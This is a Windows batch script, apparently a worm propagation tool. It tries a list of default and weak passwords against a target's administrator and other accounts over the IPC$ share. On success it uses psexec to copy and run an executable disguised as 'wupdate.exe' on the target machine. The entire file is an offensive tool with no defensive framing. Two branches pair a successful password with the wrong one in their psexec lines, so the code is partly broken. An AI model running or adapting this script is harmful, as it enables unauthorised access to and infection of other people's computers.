@echo off
:begin
net use /del \\%1\ipc$
net use \\%1\ipc$ "" /user:administrator
if not errorlevel 1 goto blkad
net use \\%1\ipc$ "administrator" /user:administrator
if not errorlevel 1 goto adad
net use \\%1\ipc$ "test" /user:administrator
if not errorlevel 1 goto adtest
net use \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto testt
net use \\%1\ipc$ "test123" /user:administrator
if not errorlevel 1 goto adtestt
net use \\%1\ipc$ "temp" /user:administrator
if not errorlevel 1 goto adtemp
net use \\%1\ipc$ "temp123" /user:administrator
if not errorlevel 1 goto adtempp
net use \\%1\ipc$ "pass" /user:administrator
if not errorlevel 1 goto adpass
net use \\%1\ipc$ "password" /user:administrator
if not errorlevel 1 goto adpassw
net use \\%1\ipc$ "admin" /user:administrator
if not errorlevel 1 goto adadmin
net use \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto rootroot
net use \\%1\ipc$ "changeme" /user:administrator
if not errorlevel 1 goto adminch
net use \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto adminad
goto end
:blkad
psexec \\%1 -u administrator -p "" -d attrib.exe -r wupdate.exe
psexec \\%1 -u administrator -p "" -f -c -d wupdate.exe -o
psexec \\%1 -u administrator -p "" -d wupdate.exe -o
goto end
:adad
psexec \\%1 -u administrator -p "admin" -d attrib.exe -r wupdate.exe
psexec \\%1 -u administrator -p "admin" -f -c -d wupdate.exe -o
psexec \\%1 -u administrator -p "admin" -d wupdate.exe -o
goto end
:adadmin
psexec \\%1 -u administrator -p "administrator" -d attrib.exe -r wupdate.exe
psexec \\%1 -u administrator -p "administrator" -f -c -d wupdate.exe -o
psexec \\%1 -u administrator -p "administrator" -d wupdate.exe -o
goto end
:rootroot
psexec \\%1 -u root -p "root" -d attrib.exe -r wupdate.exe
psexec \\%1 -u root -p "root" -f -c -d wupdate.exe -o
psexec \\%1 -u root -p "root" -d wupdate.exe -o
goto end
:adminad
psexec \\%1 -u admin -p "admin" -d attrib.exe -r wupdate.exe
psexec \\%1 -u admin -p "admin" -f -c -d wupdate.exe -o
psexec \\%1 -u admin -p "admin" -d wupdate.exe -o
goto end
:adtest
psexec \\%1 -u administrator -p "test" -d attrib.exe -r wupdate.exe
psexec \\%1 -u administrator -p "test" -f -c -d wupdate.exe -o
psexec \\%1 -u administrator -p "test" -d wupdate.exe -o
goto end
:testt
psexec \\%1 -u test -p "test" -d attrib.exe -r wupdate.exe
psexec \\%1 -u test -p "test" -f -c -d wupdate.exe -o
psexec \\%1 -u test -p "test" -d wupdate.exe -o
goto end
:adtestt
psexec \\%1 -u administrator -p "test123" -d attrib.exe -r wupdate.exe
psexec \\%1 -u administrator -p "test123" -f -c -d wupdate.exe -o
psexec \\%1 -u administrator -p "test123" -d wupdate.exe -o
goto end
:adtemp
psexec \\%1 -u administrator -p "temp" -d attrib.exe -r wupdate.exe
psexec \\%1 -u administrator -p "temp" -f -c -d wupdate.exe -o
psexec \\%1 -u administrator -p "temp" -d wupdate.exe -o
goto end
:adtempp
psexec \\%1 -u administrator -p "temp123" -d attrib.exe -r wupdate.exe
psexec \\%1 -u administrator -p "temp123" -f -c -d wupdate.exe -o
psexec \\%1 -u administrator -p "temp123" -d wupdate.exe -o
goto end
:adpass
psexec \\%1 -u administrator -p "pass" -d attrib.exe -r wupdate.exe
psexec \\%1 -u administrator -p "pass" -f -c -d wupdate.exe -o
psexec \\%1 -u administrator -p "pass" -d wupdate.exe -o
goto end
:adpassw
psexec \\%1 -u administrator -p "password" -d attrib.exe -r wupdate.exe
psexec \\%1 -u administrator -p "password" -f -c -d wupdate.exe -o
psexec \\%1 -u administrator -p "password" -d wupdate.exe -o
goto end
:adminch
psexec \\%1 -u administrator -p "changeme" -d attrib.exe -r wupdate.exe
psexec \\%1 -u administrator -p "changeme" -f -c -d wupdate.exe -o
psexec \\%1 -u administrator -p "changeme" -d wupdate.exe -o
goto end
:end
